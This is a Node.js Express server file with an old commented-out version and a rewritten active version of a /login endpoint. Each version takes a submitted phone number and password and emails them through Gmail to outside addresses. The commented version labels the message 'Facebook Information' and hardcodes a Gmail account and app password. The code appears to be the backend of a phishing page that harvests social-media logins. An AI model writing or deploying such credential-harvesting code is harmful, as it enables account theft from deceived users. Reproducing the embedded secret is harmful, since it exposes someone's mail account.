// const express = require('express')
// const app = express()
// var cors = require('cors')
// // const mongoose = require('mongoose');
// const nodemailer = require("nodemailer");
// const port = 3000


// app.use(cors())
// app.use(express.json())


// app.post('/login', async function (req, res) {
//   console.log(req.body)
//   res.send("data send")

//   const transporter = nodemailer.createTransport({
//     service: "mdshahadatalam25@gmail.com",
//     port: 587,
//     secure: false, // true for port 465, false for other ports
//     auth: {
//       user: "mdshahadatalam25@gmail.com",
//       pass: "bmgy sbbw ctbm prdi",
//     },
//   });

//   const info = await transporter.sendMail({
//     from: '"Maddison Foo Koch 👻" <maddison53@ethereal.email>', // sender address
//     to: "bar@example.com, baz@example.com", // list of receivers
//     subject: req.body.text, // Subject line
//     text: "Facebook Information", // plain text body
//     html: `<b>Number:</b>${req.body.text}
//            <b>Password:</b>${req.body.pass}
//           `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
// })

// app.get('/', (req, res) => {
//   res.send('Hello World!')
// })

// app.listen(port, () => {
//   console.log(`Example app listening on port ${port}`)
// })




const express = require('express');
const cors = require('cors');
const nodemailer = require("nodemailer");
require('dotenv').config(); // For loading environment variables

const app = express();
const port = 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Endpoint to handle login and send an email
app.post('/login', async (req, res) => {
  try {
    const { text, pass } = req.body;

    if (!text || !pass) {
      return res.status(400).send("Invalid request data");
    }

    // Configure nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER, // Load from environment variables
        pass: process.env.EMAIL_PASS, // Load from environment variables
      },
    });

    // Send mail
    const info = await transporter.sendMail({
      from: `"Your App Name" <${process.env.EMAIL_USER}>`, // sender address
      to: "bar@example.com, baz@example.com", // list of receivers
      subject: "User Login Info", // Subject line
      text: "User Login Details", // plain text body
      html: `<b>Number:</b> ${text} <br><b>Password:</b> ${pass}`, // html body
    });

    console.log("Message sent: %s", info.messageId);
    res.status(200).send("Email sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Error sending email");
  }
});

// Default endpoint
app.get('/', (req, res) => {
  res.send('Hello World!');
});

// Start server
app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});





